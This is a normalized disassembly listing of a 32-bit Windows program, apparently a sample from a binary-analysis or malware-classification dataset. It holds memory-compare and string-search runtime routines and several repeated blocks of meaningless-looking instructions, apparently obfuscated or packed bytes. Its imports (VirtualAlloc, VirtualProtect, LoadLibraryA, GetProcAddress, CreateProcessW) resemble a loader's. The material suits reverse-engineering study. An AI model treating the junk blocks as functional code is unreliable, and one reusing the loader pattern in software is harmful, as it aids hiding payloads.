je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
movzx esi [ edx - 0x19 ]
movzx eax [ ecx - 0x19 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x15 ]
movzx eax [ ecx - 0x15 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x11 ]
movzx eax [ ecx - 0x11 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xd ]
movzx eax [ ecx - 0xd ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x9 ]
movzx eax [ ecx - 0x9 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x5 ]
movzx eax [ ecx - 0x5 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx ebx [ edx - 0x1 ]
movzx eax [ ecx - 0x1 ]
sub ebx eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1a ]
movzx eax [ ecx - 0x1a ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x16 ]
movzx eax [ ecx - 0x16 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x12 ]
movzx eax [ ecx - 0x12 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xe ]
movzx eax [ ecx - 0xe ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xa ]
movzx eax [ ecx - 0xa ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x6 ]
movzx eax [ ecx - 0x6 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx ebx [ edx - 0x2 ]
movzx eax [ ecx - 0x2 ]
sub ebx eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1b ]
movzx eax [ ecx - 0x1b ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x17 ]
movzx eax [ ecx - 0x17 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x13 ]
movzx eax [ ecx - 0x13 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xf ]
movzx eax [ ecx - 0xf ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xb ]
movzx eax [ ecx - 0xb ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x7 ]
movzx eax [ ecx - 0x7 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x3 ]
movzx eax [ ecx - 0x3 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x1c ]
movzx eax [ ecx - 0x1c ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x18 ]
movzx eax [ ecx - 0x18 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x14 ]
movzx eax [ ecx - 0x14 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x10 ]
movzx eax [ ecx - 0x10 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xc ]
movzx eax [ ecx - 0xc ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x8 ]
movzx eax [ ecx - 0x8 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx ebx [ edx - 0x4 ]
movzx eax [ ecx - 0x4 ]
sub ebx eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
mov eax [ edx + 0xc ]
cmp eax [ ecx + 0xc ]
je r-xdata
movzx esi [ edx + 0x9 ]
movzx eax [ ecx + 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0x7 ]
movzx eax [ ecx + 0x7 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ebx ebx
setg al
lea ebx [ eax * 2 - 0x1 ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ebx ebx
setg al
lea ebx [ eax * 2 - 0x1 ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ebx ebx
setg al
lea ebx [ eax * 2 - 0x1 ]
mov eax ebx
movzx esi al
movzx eax [ ecx + 0xc ]
sub esi eax
je r-xdata
movzx esi [ edx + 0xa ]
movzx eax [ ecx + 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax [ edx + 0x10 ]
cmp eax [ ecx + 0x10 ]
je r-xdata
movzx esi [ edx + 0xd ]
movzx eax [ ecx + 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0xb ]
movzx eax [ ecx + 0xb ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x10 ]
sub esi eax
je r-xdata
movzx esi [ edx + 0xe ]
movzx eax [ ecx + 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ edx + 0x14 ]
cmp eax [ ecx + 0x14 ]
je r-xdata
movzx esi [ edx + 0x11 ]
movzx eax [ ecx + 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0xf ]
movzx eax [ ecx + 0xf ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x14 ]
sub esi eax
je r-xdata
movzx esi [ edx + 0x12 ]
movzx eax [ ecx + 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ edx + 0x18 ]
cmp eax [ ecx + 0x18 ]
je r-xdata
movzx esi [ edx + 0x15 ]
movzx eax [ ecx + 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0x13 ]
movzx eax [ ecx + 0x13 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x18 ]
sub esi eax
je r-xdata
movzx esi [ edx + 0x16 ]
movzx eax [ ecx + 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ edx + 0x1c ]
cmp eax [ ecx + 0x1c ]
je r-xdata
movzx esi [ edx + 0x19 ]
movzx eax [ ecx + 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0x17 ]
movzx eax [ ecx + 0x17 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x1c ]
sub esi eax
je r-xdata
movzx esi [ edx + 0x1a ]
movzx eax [ ecx + 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
push 0x20
pop esi
sub edi esi
add edx esi
add ecx esi
cmp edi esi
jae r-xdata
movzx esi [ edx + 0x1d ]
movzx eax [ ecx + 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0x1b ]
movzx eax [ ecx + 0x1b ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx esi [ edx + 0x1e ]
movzx eax [ ecx + 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
movzx esi [ edx + 0x1f ]
movzx eax [ ecx + 0x1f ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
test eax eax
jne r-xdata
sub_44bf10
push ebp
mov ebp esp
push edi
cmp [ rw-data ] 0x1
jb r-xdata
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov edi [ ebp + 0x8 ]
ja r-xdata
mov eax edi
xor eax eax
jmp r-xdata
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
movzx edx [ ebp + 0xc ]
mov eax edx
shl edx 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov ecx 0xf
and ecx edi
or eax 0xffffffff
shl eax cl
sub edi ecx
xor edx edx
cld
pop edi
leave
retn
mov eax 0xfffffff0
and eax edi
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax ]
mov ecx 0xf
and ecx edi
mov edx 0xffffffff
shl edx cl
pmovmskb edi xmm0
and edi edx
jne r-xdata
xor eax eax
test edi 0xf
je r-xdata
push ebx
pmovmskb ebx xmm1
and ebx eax
shl ecx 0x1
xor eax eax
sub eax ecx
and ecx eax
dec ecx
and ecx ebx
pop ebx
bsr eax ecx
add eax edi
test ecx ecx
cmove eax edx
pop edi
leave
retn
pmovmskb ecx xmm1
and ecx eax
bsr eax ecx
add eax edi
test ecx ecx
cmovne edx eax
or eax 0xffffffff
add edi 0x10
jmp r-xdata
bsf edx edi
add eax edx
jmp r-xdata
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax + 0x10 ]
add eax 0x10
pmovmskb edi xmm0
test edi edi
je r-xdata
movd xmm0 edx
movzx ecx [ edi ]
cmp ecx edx
cmove eax edi
test ecx ecx
je r-xdata
movdqu xmm1 [ edi ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
pop edi
leave
retn
add edi 0x10
pcmpistri xmm0 [ edi - 0x10 ] 0x40
lea ecx [ edi + ecx - 0x10 ]
cmovb eax ecx
jne r-xdata
inc edi
test edi 0xf
jne r-xdata
sub_44c050
cmp [ rw-data ] 0x1
jb r-xdata
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
movzx eax [ esp + 0x8 ]
mov edx eax
shl eax 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov edx [ esp + 0x4 ]
mov ecx 0xf
or eax 0xffffffff
and ecx edx
shl eax cl
sub edx ecx
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
bsf eax ecx
add eax edx
movd edx xmm3
xor ecx ecx
cmp dl [ eax ]
cmovne eax ecx
retn
or eax 0xffffffff
add edx 0x10
jmp r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
movdqu xmm1 [ edx ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
por xmm2 xmm1
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_44c17b
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
mov ecx [ ebx + 0x8 ]
sub esp 0x20
cmp [ rw-data ] 0x1
mov dx [ ebx + 0xc ]
jl r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
movzx eax dx
movd xmm0 eax
pshuflw xmm0 xmm0 0x0
pshufd xmm2 xmm0 0x0
cmp ax dx
je r-xdata
xor eax eax
cmp [ ecx ] dx
setne al
dec eax
and eax ecx
jmp r-xdata
movzx eax [ ecx ]
cmp ax dx
je r-xdata
movups xmm0 [ ecx ]
pxor xmm1 xmm1
pcmpeqw xmm1 xmm0
pcmpeqw xmm0 xmm2
por xmm1 xmm0
pmovmskb eax xmm1
test eax eax
jne r-xdata
add ecx 0x2
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
mov eax ecx
test ax ax
je r-xdata
bsf eax eax
mov [ ebp - 0x4 ] eax
add ecx eax
jmp r-xdata
add ecx 0x10
jmp r-xdata
xor eax eax
jmp r-xdata
add ecx 0x2
jmp r-xdata
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
sub_401290
push esi
mov esi ecx
push 0x7dc
push 0x0
lea eax [ esi + 0x4 ]
mov [ esi ] 0x0
push eax
call sub_40dea0
add esp 0xc
mov eax esi
pop esi
retn
sub_4012b0
retn
sub_4012c0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
push [ ecx ]
mov [ rw-data ] 0x1
push [ ebp + 0x8 ]
call sub_401400
mov eax 0x1
pop ebp
retn 0xc
sub_4015e0
retn
sub_4015f0
mov [ ecx + 0x108 ] 0x1
mov eax ecx
mov [ ecx + 0x10c ] 0x1
retn
sub_401610
retn
sub_4019d0
mov eax rw-data
retn
sub_401a80
retn
sub_401b00
push esi
mov esi ecx
push 0x104
lea eax [ esi + 0x14 ]
mov [ esi + 0xc00 ] 0x0
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
mov eax esi
pop esi
retn
sub_401b30
retn
sub_401f12
push ebx
push esp
push eax
push esp
push edx
call sub_40201e
jae 0xffffffffccc32e7a
add [ eax ] al
add [ ecx - 0x7edb8a1d ] al
iretd
sub_40258c
add esp 0x80
retn
sub_4027e6
push ebp
pushfd
push edi
pushfd
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
sub_402843
ja r-xdata
pop eax
pop edx
add esp 0x4
jae r-xdata
xor edx 0xd1e8509c
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
sub_4029b1
push ebx
sub esp 0x14
call sub_4029bf
mov ecx 0xc281e579
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4029d2
jmp [ 0x70246c83 ]
jl 0xffffffffebc13147
sub_4029bf
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4029d2
jmp [ 0x70246c83 ]
jl 0xffffffffebc13147
sub_4029fb
push ebp
push edx
push edi
push ebx
call sub_402a0a
jne 0xffffffffa3a5107d
sub_402a2e
jmp [ esp + 0xa8 ]
sub_402a82
jmp [ esp + 0x2c ]
sub_402c34
add esp 0x68
retn
sub_402deb
push ebx
push esp
push eax
push esp
push edx
call sub_402ef7
jae 0xffffffffccc33d53
add [ eax ] al
add [ ecx - 0x7edb8a1d ] al
iretd
sub_403465
add esp 0x80
retn
sub_4036bf
push ebp
pushfd
push edi
pushfd
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
sub_40371c
ja r-xdata
pop eax
pop edx
add esp 0x4
jae r-xdata
xor edx 0xd1e8509c
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
sub_4037b2
push ebx
sub esp 0x14
call sub_4037c0
mov ecx 0xc281e579
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4037d3
jmp [ 0x70246c83 ]
jl 0xffffffffebc13f48
sub_4037c0
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4037d3
jmp [ 0x70246c83 ]
jl 0xffffffffebc13f48
sub_4037fc
push ebp
push edx
push edi
push ebx
call sub_40380b
jne 0xffffffffa3a51e7e
sub_40382f
jmp [ esp + 0xa8 ]
sub_403883
jmp [ esp + 0x2c ]
sub_403a63
add esp 0x68
retn
sub_403d28
push ebx
push esp
push eax
push esp
push edx
call sub_403e34
jae 0xffffffffccc34c90
add [ eax ] al
add [ ecx - 0x7edb8a1d ] al
iretd
sub_4043a2
add esp 0x80
retn
sub_4045fc
push ebp
pushfd
push edi
pushfd
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
sub_404659
ja r-xdata
pop eax
pop edx
add esp 0x4
jae r-xdata
xor edx 0xd1e8509c
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
sub_4046ef
push ebx
sub esp 0x14
call sub_4046fd
mov ecx 0xc281e579
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_404710
jmp [ 0x70246c83 ]
jl 0xffffffffebc14e85
sub_4046fd
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_404710
jmp [ 0x70246c83 ]
jl 0xffffffffebc14e85
sub_404739
push ebp
push edx
push edi
push ebx
call sub_404748
jne 0xffffffffa3a52dbb
sub_40476c
jmp [ esp + 0xa8 ]
sub_4047c0
jmp [ esp + 0x2c ]
sub_404987
add esp 0x68
retn
sub_404a10
push ebp
mov ebp esp
pop ebp
jmp sub_40dffa
sub_404a50
mov eax ecx
retn
sub_404a60
retn
sub_404e00
mov eax ecx
retn
sub_404e10
retn
j_sub_404e10
jmp sub_404e10
sub_408ee6
push es
push es
pop es
or [ eax ] cl
or [ ecx ] ecx
or cl [ edx ]
or ecx [ ebx ]
or al 0xc
or eax 0xd0d0d0d
int3
sub_40b832
push es
push es
pop es
or [ eax ] cl
or [ ecx ] ecx
or cl [ edx ]
or ecx [ ebx ]
or al 0xc
or eax 0xd0d0d0d
int3
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
Sleep
jmp [ Sleep@IAT ]
lstrcpynW
jmp [ lstrcpynW@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
lstrcmpiW
jmp [ lstrcmpiW@IAT ]
lstrcatW
jmp [ lstrcatW@IAT ]
lstrlenW
jmp [ lstrlenW@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
GetModuleFileNameW
jmp [ GetModuleFileNameW@IAT ]
CreateProcessW
jmp [ CreateProcessW@IAT ]
MessageBoxW
jmp [ MessageBoxW@IAT ]
GetMessageW
jmp [ GetMessageW@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
DispatchMessageW
jmp [ DispatchMessageW@IAT ]
DefWindowProcW
jmp [ DefWindowProcW@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RegisterClassExW
jmp [ RegisterClassExW@IAT ]
CreateWindowExW
